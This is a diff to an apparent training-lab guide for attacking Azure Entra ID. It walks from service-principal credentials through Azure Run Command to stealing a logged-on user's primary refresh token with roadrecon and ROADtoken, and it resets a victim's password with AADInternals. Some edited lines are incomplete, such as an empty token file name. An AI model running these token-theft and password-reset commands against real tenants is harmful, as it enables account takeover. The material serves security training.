@@ -3,6 +3,8 @@ creds of an SP -> azure run command -> vm that has user logged on -> steal user 
 
 # Preparations
 1. RDP login to DC VM using the YOURDOMAIN\rootuser
+then, run the following powershell script as admin:
+    
 2. RDP login to Win11 VM using the YOURDOMAIN\user1, keep this window open in the background - you're not allowed to use it from now on.
 
 # Instructions
@@ -88,6 +90,7 @@ $onpremSyncedUsers | ForEach-Object {
     } 
 } | Format-Table -Wrap -AutoSize
 ```
+Target user2, as he holds a privileged role.. 
 
 Reset the victim user's Entra password:
 ```powershell
@@ -106,7 +109,7 @@ Set-AADIntUserPassword -SourceAnchor "IMMUTABLE_ID" -Password "MYPASS" -Verbose
 
 <details>
     <summary><b>Hint 2</b></summary>
-    
+
     You can find the virtual machine Win11 and using the Run Command extension execute PowerShell script on it
 </details>
 
@@ -119,21 +122,28 @@ Set-AADIntUserPassword -SourceAnchor "IMMUTABLE_ID" -Password "MYPASS" -Verbose
 
 <details>
     <summary><b>Hint 4</b></summary>
-```powershell
-# You'll need to impersonate to the logged on user, consider using:
-Install-Module Impersonate -Force -AllowClobber
-Import-Module Impersonate
-```
+
+    user1 is a part of the company's red team, he continuously, on a regular basis, runs scripts from his Desktop folder to map their Entra tenant attack surface. Use that to your advantage.
 </details>
 
 <details>
 <summary><b>Solution</b></summary>
+
+user1 uses roadrecon to map attack surfaces in his company's attack surface, the script is executed on a regular basis.
+as we learned, roadrecon writes a file with the access token called "", we can take that access token and steal it!
 1. Get the logged in user's access token: run the following command from the Run Command Window in the Azure portal:
+
 ```powershell
-Install-Module Impersonate -Force -AllowClobber
-Import-Module Impersonate
-Invoke-Impersonation -Username "YOURDOMAIN\user1" -PsCommandToRun 'Import-Module AADInternals; $prtToken = Get-AADIntUserPRTToken; $at = Get-AADIntAccessTokenForMSGraph -PRTToken $prtToken; $at > C:\accessToken.txt'
-Get-Content C:\accessToken.txt
+# Get the nonce first
+roadrecon auth --prt-init 
+
+# Get a new PRT Cookie
+.\ROADtoken.exe <nonce> 
+
+# this will AUTOMATICALLY open a browser and log in as that user (!)
+roadrecon auth -r msgraph -c "1950a258-227b-4e31-a9cf-717495945fc2" --prt-cookie $prtToken 
+ <eyJh... PRT COOKIE>
+
 ```
 </details>
 
@@ -150,3 +160,7 @@ Get-MgUser
 
 ### Bonus: 
 Go back to the beginning, and try steal user2 using silver ticket (Seamless SSO) instead of password reset
+
+
+## Don't forget
+Once done, delete the lab resource groups to clean up the resources
